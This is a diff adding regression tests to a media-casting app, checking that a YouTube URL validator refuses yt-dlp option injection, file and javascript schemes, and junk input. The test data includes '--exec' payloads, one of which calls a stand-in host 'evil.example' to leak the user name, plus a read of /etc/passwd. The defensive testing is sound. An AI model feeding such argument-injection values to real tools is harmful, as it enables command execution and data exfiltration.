@@ -10,6 +10,7 @@ const PL = require('../playlists.js');
 const CQ = require('../castqueue.js');
 const ID = require('../identity.js');
 const SO = require('../sonos.js');
+const YT = require('../youtube.js');
 const { calculateTrayPopupPosition } = require('../tray-popup-position.js');
 const {
   bindTrayActivation,
@@ -539,6 +540,50 @@ test('expiryOf reads the CDN expiry, and tolerates junk', () => {
   assert.strictEqual(CQ.expiryOf('https://x/videoplayback?expire=1787464000&id=abc'), 1787464000);
   assert.strictEqual(CQ.expiryOf('https://x/videoplayback?id=abc'), null);
   assert.strictEqual(CQ.expiryOf(null), null);
+});
+
+/* yt-dlp reads a leading-dash argument as an option and it has --exec, so an
+   unvalidated url reaching it as a positional is command execution rather than
+   a bad request. These pin the half of the fix that lives in the url rules; the
+   other half is the `--` separator at every ytdlp call site in server.js. */
+test('REGRESSION: a url that yt-dlp would read as an option is refused', () => {
+  for (const attack of [
+    '--exec=touch /tmp/pwned',
+    '--exec="curl evil.example/$(whoami)"',
+    '--config-locations=/tmp/evil.conf',
+    '--paths=/tmp',
+    '-o/tmp/anywhere',
+    '--load-info-json=/tmp/evil.json',
+  ]) {
+    assert.throws(() => YT.pageUrl(attack), /not a url/,
+      `yt-dlp option accepted as a url: ${attack}`);
+  }
+});
+
+test('only http and https can be cast', () => {
+  assert.throws(() => YT.pageUrl('file:///etc/passwd'), /only http and https/);
+  assert.throws(() => YT.pageUrl('javascript:alert(1)'), /only http and https/);
+  assert.throws(() => YT.pageUrl('data:text/html,hi'), /only http and https/);
+  /* a scheme yt-dlp itself understands, which is exactly why it must not pass */
+  assert.throws(() => YT.pageUrl('ytsearch:anything'), /only http and https/);
+});
+
+test('pageUrl returns the normalized url, so what was checked is what is used', () => {
+  assert.strictEqual(YT.pageUrl('  https://www.youtube.com/watch?v=abc  '),
+    'https://www.youtube.com/watch?v=abc');
+  assert.strictEqual(YT.pageUrl('HTTPS://YouTube.com/watch?v=abc'),
+    'https://youtube.com/watch?v=abc');
+  /* whatever comes back cannot begin with a dash, which is the property the
+     ytdlp call sites rely on */
+  for (const ok of ['https://youtu.be/abc', 'http://192.168.1.5:8080/x']) {
+    assert.ok(!YT.pageUrl(ok).startsWith('-'));
+  }
+});
+
+test('pageUrl refuses empty and non-string junk rather than guessing', () => {
+  for (const junk of [null, undefined, '', '   ', {}, [], 42]) {
+    assert.throws(() => YT.pageUrl(junk), /no url|not a url/);
+  }
 });
 
 test('describe() takes identity from customData, not the url', () => {
